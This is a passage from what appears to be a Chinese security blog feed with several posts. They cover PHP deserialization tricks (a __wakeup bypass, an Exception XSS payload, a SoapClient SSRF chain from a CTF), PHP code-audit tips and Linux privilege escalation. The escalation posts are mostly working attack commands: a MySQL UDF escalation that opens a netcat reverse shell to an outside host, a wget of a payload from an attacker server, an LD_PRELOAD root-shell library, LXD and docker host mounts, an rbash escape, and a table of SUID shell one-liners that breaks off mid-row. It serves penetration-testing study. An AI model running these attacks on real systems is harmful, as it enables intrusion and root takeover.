漏洞："></a>__wakeup 漏洞：</h2><p>漏洞影响范围<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p><p>在反序列化一个对象时被自动调用</p><p>在安全编程中，__wakeup() 方法经常用于控制对象的反序列化过程，以避免攻击者能够在反序列化期间执行恶意代码。这是因为反序列化操作本质上是在将一个字符串转换为可执行的代码，因此如果反序列化的对象包含恶意代码，那么它可能会在反序列化过程中执行。</p><p>绕过：当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过 __wakeup 函数的执⾏。</p><h2 id="原生类漏洞利用："><a href="#原生类漏洞利用：" class="headerlink" title="原生类漏洞利用："></a>原生类漏洞利用：</h2><p>php 中内置很多原生的类，在 CTF 中常以 echo new $a ($b); 这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。</p><p>下面代码可以查看内置原生类，可对实际情况进行选择性的查看原生类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>以此道题为例：</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-18.png"></p><p>给了 flag.php 文件进行提示，访问的 ip 地址必须为 127.0.0.1，且 token 为 ctfshow, 才能拿下 flag</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-19.png"></p><p>进入页面，只有几行代码，考虑使用原生态利用</p><p>调用了 getFlag () 方法，但 getFlag () 方法不存在</p><p><strong>使用报错类</strong></p><p>Error&#x2F;Exception 触发 XSS</p><p>Error&#x2F;Exception 中有个__toString () 方法，能将我们输入的 xss 内容输出</p><p>POC 链的构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">////输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><p>使用 SoapClient 构造 SSRF</p><p>(PHP 5, PHP 7, PHP 8)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>=</span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;aaa\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;url&#x27;</span> =&gt;<span class="string">&#x27;http://127.0.0.1 &#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//将编码的数据传参拿下flag.php</span></span><br></pre></td></tr></table></figure><h2 id="PHP-字符串逃逸"><a href="#PHP-字符串逃逸" class="headerlink" title="PHP 字符串逃逸"></a>PHP 字符串逃逸</h2>]]></content>
      
      
      <categories>
          
          <category> PHP安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-代码审计-1</title>
      <link href="/2025/06/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/06/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-代码审计-1"><a href="#PHP-代码审计-1" class="headerlink" title="PHP-代码审计-1"></a>PHP-代码审计-1</h1><h2 id="关于SQL的审计："><a href="#关于SQL的审计：" class="headerlink" title="关于SQL的审计："></a>关于SQL的审计：</h2><p>挖掘技巧：</p><ul><li>语句监控-数据库SQL监控排查可利用语句定向分析</li><li>功能追踪-功能点文件SQL执行代码函数调用链追踪</li><li>正则搜索-(update|select|insert|delete|).<em>?where.</em>&#x3D;</li></ul><p>如何快速的在多个文件代码里面找脆弱：<br>1、看文件路径<br>2、看代码里面的变量（可控）<br>3、看变量前后的过滤</p>]]></content>
      
      
      <categories>
          
          <category> PHP代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux提权-2</title>
      <link href="/2025/06/17/linux%E6%8F%90%E6%9D%83-2/"/>
      <url>/2025/06/17/linux%E6%8F%90%E6%9D%83-2/</url>
      
        <content type="html"><![CDATA[<h1 id="linux提权-2"><a href="#linux提权-2" class="headerlink" title="linux提权-2"></a>linux提权-2</h1><p>信息收集工具：<br><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>Mysql提权方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译UDF.so</span></span><br><span class="line">searchsploit udf</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/1518.c .</span><br><span class="line">gcc -g -shared -WL,-soname,1518.so -o udf.so 1518.c -1c</span><br><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.200.1:8080/udf.so</span><br></pre></td></tr></table></figure><p>连接进行导出调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql -u账号 -p密码</span><br><span class="line">seletc version();</span><br><span class="line">select @@basedir;     #确认mysql安装位置</span><br><span class="line">show variavles like &#x27;%basedir%&#x27;;     #确认mysql安装位置</span><br><span class="line">show variables like &#x27;%secure%&#x27;;      #查看可导出文件的位置</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;      #查看插件位置</span><br><span class="line">show variables like &#x27;%compile%&#x27;;     #查看系统版本</span><br><span class="line">use mysql;</span><br></pre></td></tr></table></figure><p>show variables like ‘%secure%’;&#x2F;&#x2F;查看可导出文件的位置这条命令执行后，查看secure_file_priv 是否开启，如果开启，将无法写入文件，则无法提权<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-05%20001749.png"></p><p>创建shell表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table shell(line blob);</span><br></pre></td></tr></table></figure><p>往shell表中插入二进制的 udf.so</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into shell values(load_file(&#x27;/tmp/udf.so&#x27;));</span><br></pre></td></tr></table></figure><p>导出 udf.so</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from shell into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;    #将/tmp/udf.so放到/usr/lib/mysql/plugin/中</span><br></pre></td></tr></table></figure><p>创建do_system函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create function do_system returns integer soname &#x27;udf.so&#x27;;</span><br><span class="line">select do_system(&#x27;nc 192.168.200.6 6666 -e /bin/bash&#x27;);</span><br></pre></td></tr></table></figure><h2 id="Capability"><a href="#Capability" class="headerlink" title="Capability"></a>Capability</h2><p>相当于SUID的升级版</p><p>可以理解为水平权限的分离。以往如果需要某个程序的某个功能需要特权，我们就只能使用root来执行或者给其增加SUID权限，一旦这样，我们等于赋予了这个程序所有的特权，这是不满足权限最小化的要求的；在引入capabilities后，root的权限被分隔成很多子权限，这就避免了滥用特权的问题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/bin/php /tmp/php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置特权</span></span><br><span class="line">setcap cap_setuid+epp /tmp/php   #将/tmp/php设置特权为setuid</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除特权</span></span><br><span class="line">setcap -r /tmp/php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看单个特权</span></span><br><span class="line">getcap /usr/bin/php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看所有特权</span></span><br><span class="line">getcap -r / 2&gt;/dev/null</span><br><span class="line">/sbin/getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>1，SUID利用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp $(which php) .</span><br><span class="line">sudo setcap cap_setuid+ep php</span><br><span class="line"></span><br><span class="line">./php -r &quot;posix_setuid(0); system(&#x27;/bin/sh&#x27;);&quot;</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-05%20235807.png"><br>前者为程序，后者为特权，如果特权足够大，将会导致提权<br>2，进程注入<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-06%20001125.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usr/bin/python2.7 = cap_sys_ptrace+ep</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">cap_sys_ptrace表示允许跟踪进程</span></span><br></pre></td></tr></table></figure><p>利用方法：<br>利用usr&#x2F;bin&#x2F;python2.7去跟踪一个root权限的进程，来获取权限<br>所以需要写一个进程注入脚本</p><h2 id="LD-Preload加载"><a href="#LD-Preload加载" class="headerlink" title="LD_Preload加载"></a>LD_Preload加载</h2><p>LD_Preload是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序前优先加载的动态链接库，所谓的动态链接库其实就是DLL文件（linux为SO文件）<br>利用原理：<br>因为允许你定义在程序前优先加载的动态链接库，所以自己写一个so文件，让其加载</p><p>在etc&#x2F;sudoers文件中存在两个信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DEfaults        env_keep += LD_PRELOAD  #设置LD_Preload权限的开启</span><br><span class="line">test    ALL=(ALL:ALL) NOPASSWD: /usr/bin/find   #普通用户sudo的执行权限</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：这里&#x2F;usr&#x2F;bin&#x2F;find可以是任何文件，也可能是第三方文件，如果真是find，那么就不会用到此提权手法了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init()&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">同样在Windows操作系统中使用.dll文件</span></span><br><span class="line">ls -al shell.so</span><br><span class="line">sudo LD_PRELOAD=/tmp/shell.so find</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让find执行时绑定shell.so</span></span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p>相当于sudo提权的升级版</p><h2 id="LXD容器"><a href="#LXD容器" class="headerlink" title="LXD容器"></a>LXD容器</h2><p>原理：<br>LXD是基于LXC容器的管理程序，当前用户可操作容器，<br>理解为用户创建一个容器，再用容器挂载宿主机磁盘，<br>最后使用容器权限操作宿主机磁盘内容达到提权效果。<br>LXD提权条件：</p><ul><li>已经获得shell</li><li>用户属于LXD组<br>利用手法：<br>创建容器，挂载磁盘，进入容器，进入目录提权</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">向被攻击机传入镜像alpine-v3.13.x86_64-20210218_0139.tar.gz，如果有网可直接在shell中拉取</span></span><br><span class="line">lxc image import ./alpine-v3.13.x86_64-20210218_0139.tar.gz --alias test</span><br><span class="line">lxc init test test -c security.privileged=true</span><br><span class="line">lxc config device add test test disk source=/ path=/mnt/root recursive=true</span><br><span class="line">lxc start test</span><br><span class="line">lxc exec test /bin/sh</span><br><span class="line">cd /mnt/root/root</span><br></pre></td></tr></table></figure><h2 id="docker容器"><a href="#docker容器" class="headerlink" title="docker容器"></a>docker容器</h2><p>提权条件：</p><ul><li>获得shell</li><li>用户属于docker组<br>创建容器，挂载磁盘，进入容器，进入目录提权</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt -it alpine #随便拉一个镜像</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一个/ 表示真机的根目录</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/mnt表示虚拟机目录</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/:/mnt表示将真机的根目录放到虚拟机的/mnt目录下</span></span><br><span class="line">cd /mnt/root</span><br></pre></td></tr></table></figure><h2 id="rbash绕过"><a href="#rbash绕过" class="headerlink" title="rbash绕过"></a>rbash绕过</h2><p><a href="https://www.cnblogs.com/yuy0ung/articles/18305203">https://www.cnblogs.com/yuy0ung/articles/18305203</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux提权-1</title>
      <link href="/2025/06/17/linux%E6%8F%90%E6%9D%83-1/"/>
      <url>/2025/06/17/linux%E6%8F%90%E6%9D%83-1/</url>
      
        <content type="html"><![CDATA[<h1 id="linux提权-1"><a href="#linux提权-1" class="headerlink" title="linux提权-1"></a>linux提权-1</h1><p>《Linux提权方法论》<br><a href="https://github.com/Getshell/LinuxTQ">https://github.com/Getshell/LinuxTQ</a><br>提权网站：<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a><br><a href="https://xz.aliyun.com/news/11110">https://xz.aliyun.com/news/11110</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>当前主机的操作系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl</span><br><span class="line">cat /etc/*-release</span><br><span class="line">lsb_release -a </span><br><span class="line">cat /etc/lsb-release # Debain</span><br><span class="line">cat /etc/redhat-release # Redhat</span><br><span class="line">cat /etc/centos-release  # Centos</span><br><span class="line">cat /etc/os-release  # Ubuntu</span><br><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure><p>当前主机的内核版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl</span><br><span class="line">uname -a </span><br><span class="line">cat /proc/version</span><br><span class="line">dmesg | grep &quot;Linux version&quot;</span><br></pre></td></tr></table></figure><p>内核漏洞筛选：<br>MSF检测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure><p>提权脚本:<br><a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a><br><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></p><p>综合脚本：<br><a href="https://github.com/peass-ng/PEASS-ng">https://github.com/peass-ng/PEASS-ng</a><br><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p><h2 id="1，SUID提权"><a href="#1，SUID提权" class="headerlink" title="1，SUID提权"></a>1，SUID提权</h2><p>SUID(Set ownerUserIDupon execution)是给予文件的一个特殊类型的文件权限。在Linux&#x2F;Unix中，当一个程序运行的时候，程序将从登录用户处继承权限。<br>SUID被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</p><p>查看文件是否具有SUID属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -al file(此为要查询的文件名)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如查看<span class="built_in">sudo</span>文件的SUID属性</span></span><br><span class="line">ls -al /usr/bin/sudo</span><br></pre></td></tr></table></figure><p>SUID提权利用原理<br>SUID(Set User ID)是对二进制程序进行的一种特殊权限设置，可以让二进制程序的执行者临时拥有文件属主的权限，也正是因为这个特性，假设我们以非 root 用户身份访问目标系统，并且我们发现启用了 suid 位的二进制文件，那么这些文件&#x2F;程序&#x2F;命令可以以 root 权限运行。</p><p>如何查找 SUID 文件<br>查找当前用户可利用的具有SUID的属性的质量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">参数：</span><br><span class="line">/表示从文件系统的顶部（根）开始，查找每个目录</span><br><span class="line">-perm表示搜索后面的权限</span><br><span class="line">-u=s表示查找 root 用户拥有的文件</span><br><span class="line">-type表示我们正在寻找的文件类型</span><br><span class="line">f 表示普通文件，而不是目录或特殊文件</span><br><span class="line">2表示到进程的第二个文件描述符，即 stderr（标准错误）</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">表示重定向</span></span><br><span class="line">/dev/null是一个特殊的文件系统对象，它会丢弃写入其中的所有内容</span><br></pre></td></tr></table></figure><h3 id="常用指令提权方法"><a href="#常用指令提权方法" class="headerlink" title="常用指令提权方法:"></a><strong>常用指令提权方法:</strong></h3><table><thead><tr><th>命令</th><th>利用方法</th></tr></thead><tbody><tr><td>zsh</td><td>zsh</td></tr><tr><td>xargs</td><td>xargs -a &#x2F;dev&#x2F;null sh -p</td></tr><tr><td>watch</td><td>watch -x sh -c ‘reset; exec sh -p 1&gt;&amp;0 2&gt;&amp;0’</td></tr><tr><td>timeout</td><td>timeout 7d &#x2F;bin&#x2F;sh -p</td></tr><tr><td>time</td><td>time &#x2F;bin&#x2F;sh -p</td></tr><tr><td>tclsh</td><td>1、tclsh 2、exec &#x2F;bin&#x2F;sh -p &lt;@stdin &gt;@stdout2&gt;@stderr</td></tr><tr><td>taskset</td><td>taskset 1 &#x2F;bin&#x2F;sh -p</td></tr><tr><td>stdbuf</td><td>stdbuf -i0 &#x2F;bin&#x2F;sh -p</td></tr><tr><td>strace</td><td>strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -p</td></tr><tr><td>ssh</td><td>ssh -o ProxyCommand&#x3D;’;sh -p 0&lt;&amp;2 1&gt;&amp;2’ x</td></tr><tr><td>setarch</td><td>setarch $(arch) &#x2F;bin&#x2F;sh -p</td></tr><tr><td>rsync</td><td>rsync -e ‘sh -p -c “sh -p 0&lt;&amp;2 1&gt;&amp;2”’ 127.0.0.1:&#x2F;dev&#x2F;null</td></tr><tr><td>rpm</td><td>rpm –eval ‘%{lua:os.execute(“&#x2F;bin&#x2F;sh -p”)}’</td></tr><tr><td>python</td><td>python -c ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td></tr><tr><td>php</td><td>1、CMD&#x3D;”&#x2F;bin&#x2F;sh” 2、 php -r “pcntl_exec(‘&#x2F;bin&#x2F;sh’, [‘-p’]);”</td></tr><tr><td>nice</td><td>nice &#x2F;bin&#x2F;sh -p</td></tr><tr><td>nano</td><td>1、nano &#x2F;&#x2F;运行nano程序 2、^R &#x2F;&#x2F;按下ctrl-r 3、^X &#x2F;&#x2F;按下ctrl-x 4、reset; sh -p 1&gt;&amp;0 2&gt;&amp;0 &#x2F;&#x2F;输入下面的命令</td></tr><tr><td>more</td><td>1、more &#x2F;etc&#x2F;profile 2、!&#x2F;bin&#x2F;sh -p</td></tr><tr><td>logsave</td><td>logsave &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -i -p</td></tr><tr><td>less</td><td>less &#x2F;etc&#x2F;profile &#x2F;&#x2F;读取文件，在底行输入!&#x2F;bin&#x2F;sh -p</td></tr><tr><td>ksh</td><td>ksh -p</td></tr><tr><td>ip</td><td>1、ip netns add foo 2、ip netns exec foo 